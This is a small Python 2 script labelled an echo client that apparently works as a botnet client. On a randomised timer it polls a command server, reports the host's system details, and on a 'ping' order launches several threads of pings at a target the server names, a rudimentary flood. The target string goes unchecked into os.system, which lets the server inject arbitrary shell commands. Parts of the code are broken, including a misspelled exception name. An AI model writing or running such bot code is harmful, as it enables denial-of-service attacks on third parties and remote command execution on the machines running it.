# Echo client program
import socket
import sys
import os
from apscheduler.schedulers.blocking import BlockingScheduler
import platform
import random
import threading
import logging

HOST = 'localhost'    # The remote host
PORT = 52645              # The same port as used by the server
s = None


logging.basicConfig()

def send_ping(s,host):
    os.system("ping" + " " + " " + "-s" + " " + str(3) + " " + str(host))


def behaviour():
    for res in socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC, socket.SOCK_STREAM):
        af, socktype, proto, canonname, sa = res
        try:
            s = socket.socket(af, socktype, proto)
        except socket.errors as msg:
            s = None
            continue
        try:
            s.connect(sa)
        except socket.error as msg:
            s.close()
            s = None
            continue
        break
    if s is None:
        print 'could not open socket'

    s.send('update')
    data = s.recv(1024)

    print 'Received', repr(data)

    if data == "okay":
        print platform.uname()
        s.send(' '.join(platform.uname()))

    split = data.split(" ")
    print split

    if split is  None:
        exit(88)
    elif split[0] == "ping":
        host = split[1]
        threads = []
        if len(split) == 3:
            for i in range(0,int(float(split[2]))):
                temp_thread = threading.Thread(target=send_ping,args=(s,host,))
                threads.append(temp_thread)
            for thread in threads:
                thread.start()
        else:
            s.sendall("pinging")
            send_ping(s,host)

    s.close()


offset = random.randint(0,15)
scheduler = BlockingScheduler()
scheduler.add_job(behaviour, 'interval', seconds=(60+offset))
scheduler.start()
